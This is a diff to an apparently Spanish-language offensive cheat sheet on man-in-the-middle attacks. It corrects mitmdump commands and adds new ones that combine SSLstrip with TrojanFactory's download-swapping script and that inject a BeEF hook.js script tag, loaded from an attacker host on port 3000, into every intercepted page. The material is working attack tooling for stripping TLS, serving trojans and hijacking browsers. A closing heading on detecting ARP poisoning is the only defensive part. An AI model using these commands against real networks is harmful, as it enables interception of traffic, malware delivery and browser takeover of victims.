@@ -335,7 +335,7 @@ python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path)
 ```
 run it
 ```
-mirmdump -s script.py -transparent
+mitmdump -s script.py -m transparent
 ```
 
 mitmproxy_script.py from TrojanFactory  
@@ -349,14 +349,21 @@ SPOOF_EXTENSION = True
 ```
 run it
 ```
-mirmdump -s mitmproxy_script.py -transparent
+mitmdump -s mitmproxy_script.py -m transparent
 ```
 SSLstrip
 - https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/complex
 ```
-mirmdump -s sslstrip.py -transparent
+mitmdump -s sslstrip.py -m transparent
 ```
-
+sslstrip.py and mitmproxy_script.py
+```
+mitmdump -s sslstrip.py -s mitmproxy_script.py -m transparent
+```
+sslstrip.py and beef hook.js inject
+```
+mitmdump -s sslstrip.py -m transparent --modify-body /~s/"</body>"/"<script src='http://ip:3000/hook.js'></script></body>"
+```
 
 ## Detectar Arp Poisoning:  
 comprovamos que los mac de las ips son unicos  
